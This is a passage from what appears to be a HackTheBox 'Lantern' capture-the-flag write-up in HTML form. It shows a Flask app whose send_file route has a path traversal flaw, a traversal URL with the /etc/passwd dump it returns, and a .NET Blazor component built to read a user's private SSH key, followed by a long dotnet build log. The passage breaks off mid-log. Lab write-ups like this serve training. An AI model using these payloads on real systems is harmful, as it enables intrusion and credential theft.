Developer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;resume&#x27;</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file = request.files[<span class="string">&#x27;resume&#x27;</span>]</span><br><span class="line">            resume_name = file.filename</span><br><span class="line">            <span class="keyword">if</span> resume_name.endswith(<span class="string">&#x27;.pdf&#x27;</span>) <span class="keyword">or</span> resume_name == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                filename = secure_filename(<span class="string">f&quot;resume-<span class="subst">&#123;name&#125;</span>-<span class="subst">&#123;vacancy&#125;</span>-latern.pdf&quot;</span>)</span><br><span class="line">                upload_folder = os.path.join(os.getcwd(), <span class="string">&#x27;uploads&#x27;</span>)</span><br><span class="line">                destination = <span class="string">&#x27;/&#x27;</span>.join([upload_folder, filename])</span><br><span class="line">                file.save(destination)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Only PDF files allowed!&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Something went wrong!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Thank you! We will conact you very soon!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/PrivacyAndPolicy&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendPolicyAgreement</span>():</span><br><span class="line">    lang = request.args.get(<span class="string">&#x27;lang&#x27;</span>)</span><br><span class="line">    file_ext = request.args.get(<span class="string">&#x27;ext&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> send_file(<span class="string">f&#x27;/var/www/sites/localisation/<span class="subst">&#123;lang&#125;</span>.<span class="subst">&#123;file_ext&#125;</span>&#x27;</span>) </span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">            <span class="keyword">return</span> send_file(<span class="string">f&#x27;/var/www/sites/localisation/default/policy.pdf&#x27;</span>, <span class="string">&#x27;application/pdf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure></div>
+
+
+<p>One intriguing line is:<br><code>return send_file(f&#39;/var/www/sites/localisation/&#123;lang&#125;.&#123;file_ext&#125;&#39;) </code> where we could disclose files by including the file name and the extension in the url.<br>We could disclose <code>/etc/passwd</code> in this way: <code>http://lantern.htb/PrivacyAndPolicy?lang=../../../../&amp;ext=./etc/passwd</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www/sites:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">pollinate:x:105:1::/var/cache/pollinate:/bin/false</span><br><span class="line">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">syslog:x:107:113::/home/syslog:/usr/sbin/nologin</span><br><span class="line">uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin</span><br><span class="line">tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class="line">landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class="line">tomas:x:1000:1000:tomas:/home/tomas:/bin/bash</span><br><span class="line">lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class="line">_laurel:x:998:998::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure></div>
+
+<p>(I could not get tomas’s rsa id with the same technique)</p>
+<h3 id="Web-Application-http-lantern-htb-3000-RCE"><a href="#Web-Application-http-lantern-htb-3000-RCE" class="headerlink" title="Web Application http://lantern.htb:3000 - RCE"></a>Web Application <a class="link"   target="_blank" rel="noopener" href="http://lantern.htb:3000/" >http://lantern.htb:3000 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> - RCE</h3><p>There was a specific error that intrigued me:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/admin2.png"
+                      alt="DLL Loading"
+                ><figcaption>DLL Loading</figcaption></figure></p>
+<p>It said that it could not “load file or assembly” which would imply actually executing the DLLs under the <code>/opt/components</code> directory, which we do not have access to at the moment since everything is being uploaded to the <code>/var/www/sites/lantern.htb </code></p>
+<h4 id="Blazor-Traffic-Processor"><a href="#Blazor-Traffic-Processor" class="headerlink" title="Blazor Traffic Processor"></a>Blazor Traffic Processor</h4><p>Since the application suffers from path traversal, it means we could modify the file name we’re uploading to make it upload to the <code>/opt/components</code> folder. We could do that using the BTP (Blazor Traffic Processor) extension from the BApp store in BurpSuite Community Edition:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Lantern/BTP.png"
+                      alt="BTP"
+                ><figcaption>BTP</figcaption></figure></p>
+<p>We use BTP because we cannot read the random binaries included in the request when trying to upload a DLL file.</p>
+<p>Now what we can do is write an exploit in .NET, build it using the <code>dotnet</code> tool, upload it and see what we got:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">using Microsoft.AspNetCore.Components;</span><br><span class="line">using Microsoft.AspNetCore.Components.Rendering;</span><br><span class="line">using System.IO;</span><br><span class="line"></span><br><span class="line">namespace exploit</span><br><span class="line">&#123;</span><br><span class="line">    public class Component : ComponentBase</span><br><span class="line">    &#123;</span><br><span class="line">        protected override void BuildRenderTree(RenderTreeBuilder builder)</span><br><span class="line">        &#123;</span><br><span class="line">            base.BuildRenderTree(builder);</span><br><span class="line">           </span><br><span class="line">            // Read private SSH key of user tomas</span><br><span class="line">            string file = File.ReadAllText(&quot;/home/tomas/.ssh/id_rsa&quot;);</span><br><span class="line">           </span><br><span class="line">            builder.AddContent(0, file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>Now we build it this way (I used .NET 6.0):</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Hackthebox/exploit_project]</span><br><span class="line">└─$ dotnet new classlib -n exploit</span><br><span class="line"></span><br><span class="line">Welcome to .NET 6.0!</span><br><span class="line">---------------------</span><br><span class="line">SDK Version: 6.0.400</span><br><span class="line"></span><br><span class="line">----------------</span><br><span class="line">Installed an ASP.NET Core HTTPS development certificate.</span><br><span class="line">To trust the certificate run <span class="string">&#x27;dotnet dev-certs https --trust&#x27;</span> (Windows and macOS only).</span><br><span class="line">Learn about HTTPS: https://aka.ms/dotnet-https</span><br><span class="line">----------------</span><br><span class="line">Write your first app: https://aka.ms/dotnet-hello-world</span><br><span class="line">Find out what<span class="string">&#x27;s new: https://aka.ms/dotnet-whats-new</span></span><br><span class="line"><span class="string">Explore documentation: https://aka.ms/dotnet-docs</span></span><br><span class="line"><span class="string">Report issues and find source on GitHub: https://github.com/dotnet/core</span></span><br><span class="line"><span class="string">Use &#x27;</span>dotnet --<span class="built_in">help</span><span class="string">&#x27; to see available commands or visit: https://aka.ms/dotnet-cli</span></span><br><span class="line"><span class="string">--------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">The template &quot;Class Library&quot; was created successfully.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Processing post-creation actions...</span></span><br><span class="line"><span class="string">Running &#x27;</span>dotnet restore<span class="string">&#x27; on /home/kali/Hackthebox/exploit_project/exploit/exploit.csproj...</span></span><br><span class="line"><span class="string">  Determining projects to restore...</span></span><br><span class="line"><span class="string">  Restored /home/kali/Hackthebox/exploit_project/exploit/exploit.csproj (in 13.37 sec).</span></span><br><span class="line"><span class="string">Restore succeeded.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/Hackthebox/exploit_project]</span></span><br><span class="line"><span class="string">└─$ cd exploit        </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/Hackthebox/exploit_project/exploit]</span></span><br><span class="line"><span class="string">└─$ nano Class1.cs </span></span><br><span class="line"><span class="string">                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/Hackthebox/exploit_project/exploit]</span></span><br><span class="line"><span class="string">└─$ dotnet add package Microsoft.AspNetCore.Components --version 6.0.0 </span></span><br><span class="line"><span class="string">  Determining projects to restore...</span></span><br><span class="line"><span class="string">  Writing /tmp/tmpKho1Xa.tmp</span></span><br><span class="line"><span class="string">info : X.509 certificate chain validation will use the fallback certificate bundle at &#x27;</span>/usr/share/dotnet/sdk/6.0.400/trustedroots/codesignctl.pem<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">info : Adding PackageReference for package &#x27;</span>Microsoft.AspNetCore.Components<span class="string">&#x27; into project &#x27;</span>/home/kali/Hackthebox/exploit_project/exploit/exploit.csproj<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">info : Restoring packages for /home/kali/Hackthebox/exploit_project/exploit/exploit.csproj...</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components/index.json</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components/index.json 2934ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components/6.0.0/microsoft.aspnetcore.components.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components/6.0.0/microsoft.aspnetcore.components.6.0.0.nupkg 498ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.analyzers/index.json</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.authorization/index.json</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.analyzers/index.json 522ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.analyzers/6.0.0/microsoft.aspnetcore.components.analyzers.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.authorization/index.json 980ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.authorization/6.0.0/microsoft.aspnetcore.authorization.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.analyzers/6.0.0/microsoft.aspnetcore.components.analyzers.6.0.0.nupkg 511ms</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.authorization/6.0.0/microsoft.aspnetcore.authorization.6.0.0.nupkg 506ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.metadata/index.json</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.extensions.logging.abstractions/index.json</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.extensions.options/index.json</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.extensions.logging.abstractions/index.json 495ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.extensions.logging.abstractions/6.0.0/microsoft.extensions.logging.abstractions.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.metadata/index.json 502ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.metadata/6.0.0/microsoft.aspnetcore.metadata.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.extensions.logging.abstractions/6.0.0/microsoft.extensions.logging.abstractions.6.0.0.nupkg 70ms</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.extensions.options/index.json 871ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.extensions.options/6.0.0/microsoft.extensions.options.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.extensions.options/6.0.0/microsoft.extensions.options.6.0.0.nupkg 70ms</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.metadata/6.0.0/microsoft.aspnetcore.metadata.6.0.0.nupkg 677ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.extensions.dependencyinjection.abstractions/index.json</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.extensions.primitives/index.json</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.extensions.dependencyinjection.abstractions/index.json 521ms</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.extensions.primitives/index.json 520ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.extensions.dependencyinjection.abstractions/6.0.0/microsoft.extensions.dependencyinjection.abstractions.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.extensions.primitives/6.0.0/microsoft.extensions.primitives.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.extensions.dependencyinjection.abstractions/6.0.0/microsoft.extensions.dependencyinjection.abstractions.6.0.0.nupkg 76ms</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.extensions.primitives/6.0.0/microsoft.extensions.primitives.6.0.0.nupkg 106ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/system.runtime.compilerservices.unsafe/index.json</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/system.runtime.compilerservices.unsafe/index.json 523ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/system.runtime.compilerservices.unsafe/6.0.0/system.runtime.compilerservices.unsafe.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/system.runtime.compilerservices.unsafe/6.0.0/system.runtime.compilerservices.unsafe.6.0.0.nupkg 62ms</span></span><br><span class="line"><span class="string">info : Installed Microsoft.AspNetCore.Components.Analyzers 6.0.0 from https://api.nuget.org/v3/index.json with content hash 2cpebhhUAJXYgvrePJNXzhJfM5u6MAIuu4Nho6LEjQliMtAQ6NcdtYxkezoFxqTrgT1fZR0CSYAxp7k41q6PVQ==.</span></span><br><span class="line"><span class="string">info : Installed Microsoft.AspNetCore.Metadata 6.0.0 from https://api.nuget.org/v3/index.json with content hash giBCvjANLIOqC+DJ84zCkCQnE4ebRTrgVyBe5e0gG3/F8GYzdqSSdtMSAvbOkBQsf0F8dySBPSM59vX6ksOeQg==.</span></span><br><span class="line"><span class="string">info : Installed System.Runtime.CompilerServices.Unsafe 6.0.0 from https://api.nuget.org/v3/index.json with content hash /iUeP3tq1S0XdNNoMz5C9twLSrM/TH+qElHkXWaPvuNOt+99G75NrV0OS2EqHx5wMN7popYjpc8oTjC1y16DLg==.</span></span><br><span class="line"><span class="string">info : Installed Microsoft.AspNetCore.Authorization 6.0.0 from https://api.nuget.org/v3/index.json with content hash HPEhmNwINXzGVWirzmvVxx5/GkoaQJC7vKNIbhOUTzgnRHEf2zO6S2s4lMw3TPFWBGcAlfn6Ta0cVB9f15QC8w==.</span></span><br><span class="line"><span class="string">info : Installed Microsoft.Extensions.Options 6.0.0 from https://api.nuget.org/v3/index.json with content hash dzXN0+V1AyjOe2xcJ86Qbo233KHuLEY0njf/P2Kw8SfJU+d45HNS2ctJdnEnrWbM9Ye2eFgaC5Mj9otRMU6IsQ==.</span></span><br><span class="line"><span class="string">info : Installed Microsoft.Extensions.DependencyInjection.Abstractions 6.0.0 from https://api.nuget.org/v3/index.json with content hash xlzi2IYREJH3/m6+lUrQlujzX8wDitm4QGnUu6kUXTQAWPuZY8i+ticFJbzfqaetLA6KR/rO6Ew/HuYD+bxifg==.</span></span><br><span class="line"><span class="string">info : Installed Microsoft.AspNetCore.Components 6.0.0 from https://api.nuget.org/v3/index.json with content hash ETks/RMYyiC91P89jL9XNEwTeYlpyzt2+Z584v70h+B9//BO0cc68gAlhz3E0v/9h4NqCSHbTlopvMvj0qxnEg==.</span></span><br><span class="line"><span class="string">info : Installed Microsoft.Extensions.Primitives 6.0.0 from https://api.nuget.org/v3/index.json with content hash 9+PnzmQFfEFNR9J2aDTfJGGupShHjOuGw4VUv+JB044biSHrnmCIMD+mJHmb2H7YryrfBEXDurxQ47gJZdCKNQ==.</span></span><br><span class="line"><span class="string">info : Installed Microsoft.Extensions.Logging.Abstractions 6.0.0 from https://api.nuget.org/v3/index.json with content hash /HggWBbTwy8TgebGSX5DBZ24ndhzi93sHUBDvP1IxbZD7FDokYzdAr6+vbWGjw2XAfR2EJ1sfKUotpjHnFWPxA==.</span></span><br><span class="line"><span class="string">info : Package &#x27;</span>Microsoft.AspNetCore.Components<span class="string">&#x27; is compatible with all the specified frameworks in project &#x27;</span>/home/kali/Hackthebox/exploit_project/exploit/exploit.csproj<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">info : PackageReference for package &#x27;</span>Microsoft.AspNetCore.Components<span class="string">&#x27; version &#x27;</span>6.0.0<span class="string">&#x27; added to file &#x27;</span>/home/kali/Hackthebox/exploit_project/exploit/exploit.csproj<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">info : Generating MSBuild file /home/kali/Hackthebox/exploit_project/exploit/obj/exploit.csproj.nuget.g.targets.</span></span><br><span class="line"><span class="string">info : Writing assets file to disk. Path: /home/kali/Hackthebox/exploit_project/exploit/obj/project.assets.json</span></span><br><span class="line"><span class="string">log  : Restored /home/kali/Hackthebox/exploit_project/exploit/exploit.csproj (in 8.67 sec).</span></span><br><span class="line"><span class="string">                                                                                                                                                                                                    </span></span><br><span class="line"><span class="string">┌──(kali㉿kali)-[~/Hackthebox/exploit_project/exploit]</span></span><br><span class="line"><span class="string">└─$ dotnet add package Microsoft.AspNetCore.Components.Web --version 6.0.0 </span></span><br><span class="line"><span class="string">  Determining projects to restore...</span></span><br><span class="line"><span class="string">  Writing /tmp/tmpNbJR4o.tmp</span></span><br><span class="line"><span class="string">info : X.509 certificate chain validation will use the fallback certificate bundle at &#x27;</span>/usr/share/dotnet/sdk/6.0.400/trustedroots/codesignctl.pem<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">info : Adding PackageReference for package &#x27;</span>Microsoft.AspNetCore.Components.Web<span class="string">&#x27; into project &#x27;</span>/home/kali/Hackthebox/exploit_project/exploit/exploit.csproj<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">info : Restoring packages for /home/kali/Hackthebox/exploit_project/exploit/exploit.csproj...</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.web/index.json</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.web/index.json 2903ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.web/6.0.0/microsoft.aspnetcore.components.web.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.web/6.0.0/microsoft.aspnetcore.components.web.6.0.0.nupkg 51ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.forms/index.json</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.jsinterop/index.json</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.extensions.dependencyinjection/index.json</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/system.io.pipelines/index.json</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.forms/index.json 507ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.forms/6.0.0/microsoft.aspnetcore.components.forms.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.jsinterop/index.json 786ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.jsinterop/6.0.0/microsoft.jsinterop.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.extensions.dependencyinjection/index.json 1029ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/microsoft.extensions.dependencyinjection/6.0.0/microsoft.extensions.dependencyinjection.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/system.io.pipelines/index.json 1307ms</span></span><br><span class="line"><span class="string">info :   GET https://api.nuget.org/v3-flatcontainer/system.io.pipelines/6.0.0/system.io.pipelines.6.0.0.nupkg</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.aspnetcore.components.forms/6.0.0/microsoft.aspnetcore.components.forms.6.0.0.nupkg 895ms</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.jsinterop/6.0.0/microsoft.jsinterop.6.0.0.nupkg 659ms</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/microsoft.extensions.dependencyinjection/6.0.0/microsoft.extensions.dependencyinjection.6.0.0.nupkg 494ms</span></span><br><span class="line"><span class="string">info :   OK https://api.nuget.org/v3-flatcontainer/system.io.pipelines/6.0.0/system.io.pipelines.6.0.0.nupkg 465ms</span></span><br><span class="line"><span class="string">info : Installed System.IO.Pipelines 6.0.0 from https://api.nuget.org/v3/index.json with content hash mXX66shZ4xLlI3vNLaJ0lt8OIZdmXTvIqXRdQX5HLVGSkLhINLsVhyZuX2UdRFnOGkqnwmMUs40pIIQ7mna4+A==.</span></span><br><span class="line"><span class="string">info : 